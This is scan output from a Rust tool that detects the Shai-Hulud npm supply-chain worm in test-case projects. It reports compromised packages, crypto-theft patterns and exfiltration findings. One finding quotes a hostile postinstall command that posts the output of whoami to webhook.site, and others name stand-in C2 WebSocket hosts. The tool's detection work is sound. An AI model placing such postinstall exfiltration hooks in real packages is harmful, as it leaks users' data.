warning: variable does not need to be mutable
  --> src\lib.rs:47:13
   |
47 |         let mut compromised_namespaces = vec![
   |             ----^^^^^^^^^^^^^^^^^^^^^^
   |             |
   |             help: remove this `mut`
   |
   = note: `#[warn(unused_mut)]` on by default

Starting Shai-Hulud detection scan...
Scanning directory: "test-cases"
Result (paranoid=false): high=16, medium=38, low=0
Result (paranoid=true): high=16, medium=53, low=0
Found workflow files: ["test-cases\\infected-project\\.github\\workflows\\shai-hulud-workflow.yml"]
Compromised packages found: [("test-cases\\chalk-debug-attack\\package.json", "ansi-styles@6.2.2"), ("test-cases\\chalk-debug-attack\\package.json", "chalk@5.6.1"), ("test-cases\\chalk-debug-attack\\package.json", "debug@4.4.2"), ("test-cases\\clean-project\\package.json", "Contains packages from compromised namespace: @ctrl"), ("test-cases\\infected-project\\package.json", "@ctrl/deluge@1.2.0"), ("test-cases\\infected-project\\package.json", "@nativescript-community/ui-material-core@7.2.49"), ("test-cases\\infected-project\\package.json", "Contains packages from compromised namespace: @ctrl"), ("test-cases\\infected-project\\package.json", "Contains packages from compromised namespace: @nativescript-community"), ("test-cases\\mixed-project\\package.json", "Contains packages from compromised namespace: @ctrl")]
Postinstall hooks: [("test-cases\\infected-project\\package-with-postinstall.json", "Suspicious postinstall: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)")]
Suspicious content: [("test-cases\\infected-project\\.github\\workflows\\shai-hulud-workflow.yml", "webhook.site reference"), ("test-cases\\infected-project\\.github\\workflows\\shai-hulud-workflow.yml", "malicious webhook endpoint"), ("test-cases\\infected-project\\actual-credential-harvester.js", "webhook.site reference"), ("test-cases\\infected-project\\actual-credential-harvester.js", "malicious webhook endpoint"), ("test-cases\\infected-project\\malicious.js", "webhook.site reference"), ("test-cases\\infected-project\\malicious.js", "malicious webhook endpoint"), ("test-cases\\infected-project\\package-with-postinstall.json", "webhook.site reference"), ("test-cases\\infected-project\\package-with-postinstall.json", "malicious webhook endpoint"), ("test-cases\\mixed-project\\suspicious.js", "webhook.site reference"), ("test-cases\\network-exfiltration-project\\malicious.js", "webhook.site reference"), ("test-cases\\network-exfiltration-project\\malicious.js", "malicious webhook endpoint")]
Crypto patterns: [("test-cases\\chalk-debug-attack\\malicious-chalk.js", "Ethereum wallet address patterns detected"), ("test-cases\\chalk-debug-attack\\malicious-chalk.js", "XMLHttpRequest prototype modification detected"), ("test-cases\\chalk-debug-attack\\malicious-chalk.js", "Known crypto theft function names detected"), ("test-cases\\chalk-debug-attack\\malicious-chalk.js", "Known attacker wallet address detected - HIGH RISK"), ("test-cases\\chalk-debug-attack\\malicious-chalk.js", "Phishing domain npmjs.help detected"), ("test-cases\\chalk-debug-attack\\malicious-chalk.js", "Cryptocurrency regex patterns detected"), ("test-cases\\chalk-debug-attack\\obfuscated-payload.js", "Ethereum wallet address patterns detected"), ("test-cases\\chalk-debug-attack\\obfuscated-payload.js", "Known attacker wallet address detected - HIGH RISK"), ("test-cases\\chalk-debug-attack\\obfuscated-payload.js", "Phishing domain npmjs.help detected"), ("test-cases\\chalk-debug-attack\\obfuscated-payload.js", "JavaScript obfuscation detected"), ("test-cases\\common-crypto-libs\\ethers-usage.js", "Ethereum wallet address patterns detected"), ("test-cases\\infected-project\\crypto-theft.js", "Ethereum wallet address patterns detected"), ("test-cases\\infected-project\\crypto-theft.js", "XMLHttpRequest prototype modification detected"), ("test-cases\\infected-project\\crypto-theft.js", "Known attacker wallet address detected - HIGH RISK"), ("test-cases\\infected-project\\crypto-theft.js", "Phishing domain npmjs.help detected"), ("test-cases\\legitimate-crypto\\wallet-utils.js", "Ethereum wallet address patterns detected")]
Trufflehog activity: [("test-cases\\infected-project\\malicious-trufflehog-wrapper.sh", "HIGH", "Trufflehog binary found"), ("test-cases\\infected-project\\trufflehog-script.sh", "HIGH", "Trufflehog binary found"), ("test-cases\\false-positive-project\\express-server.js", "MEDIUM", "Contains credential scanning patterns"), ("test-cases\\infected-project\\actual-credential-harvester.js", "MEDIUM", "Contains credential scanning patterns"), ("test-cases\\infected-project\\actual-credential-harvester.js", "MEDIUM", "Potentially suspicious environment variable access"), ("test-cases\\infected-project\\malicious-trufflehog-wrapper.sh", "MEDIUM", "Contains trufflehog references in source code"), ("test-cases\\infected-project\\malicious-trufflehog-wrapper.sh", "HIGH", "Credential patterns with potential exfiltration"), ("test-cases\\infected-project\\trufflehog-script.sh", "MEDIUM", "Contains trufflehog references in source code"), ("test-cases\\infected-project\\trufflehog-script.sh", "MEDIUM", "Contains credential scanning patterns"), ("test-cases\\infected-project\\trufflehog-script.sh", "MEDIUM", "Potentially suspicious environment variable access"), ("test-cases\\legitimate-security-project\\security-scanner.py", "MEDIUM", "Contains trufflehog references in source code"), ("test-cases\\legitimate-security-project\\security-scanner.py", "MEDIUM", "Contains credential scanning patterns"), ("test-cases\\legitimate-security-project\\security-scanner.py", "MEDIUM", "Potentially suspicious environment variable access"), ("test-cases\\network-exfiltration-project\\malicious.js", "HIGH", "Environment scanning with exfiltration")]
Package integrity issues: [("test-cases\\infected-lockfile\\package-lock.json", "Compromised package in lockfile: @ctrl/tinycolor@4.1.2"), ("test-cases\\infected-lockfile\\package-lock.json", "Recently modified lockfile contains @ctrl packages (potential worm activity)")]
Network exfiltration warnings: [("test-cases\\comprehensive-test\\suspicious.js", "Hardcoded IP addresses found"), ("test-cases\\comprehensive-test\\suspicious.js", "Suspicious domain found: pastebin.com: // Comprehensive test file with various suspicious patterns"), ("test-cases\\comprehensive-test\\suspicious.js", "Base64 decoding detected"), ("test-cases\\comprehensive-test\\suspicious.js", "WebSocket connection to external endpoint: wss://c2-server.evil.com/data"), ("test-cases\\comprehensive-test\\suspicious.js", "Suspicious base64 encoding near network operation"), ("test-cases\\infected-project\\actual-credential-harvester.js", "Suspicious domain found: webhook.site: // This file simulates actual malicious credential harvesting"), ("test-cases\\infected-project\\malicious.js", "Suspicious domain found: webhook.site: // Test file with webhook.site reference for content detection"), ("test-cases\\infected-project\\package-with-postinstall.json", "Suspicious domain found: webhook.site: {"), ("test-cases\\mixed-project\\suspicious.js", "Suspicious domain found: webhook.site: // This file contains some suspicious patterns but may not be malicious"), ("test-cases\\network-exfiltration-project\\malicious.js", "Hardcoded IP addresses found"), ("test-cases\\network-exfiltration-project\\malicious.js", "Suspicious domain found: webhook.site: // Test file with network exfiltration patterns"), ("test-cases\\network-exfiltration-project\\malicious.js", "Base64 decoding detected"), ("test-cases\\network-exfiltration-project\\malicious.js", "WebSocket connection to external endpoint: wss://evil.example.com/collect"), ("test-cases\\network-exfiltration-project\\malicious.js", "Suspicious HTTP headers detected"), ("test-cases\\network-exfiltration-project\\malicious.js", "Suspicious base64 encoding near network operation")]
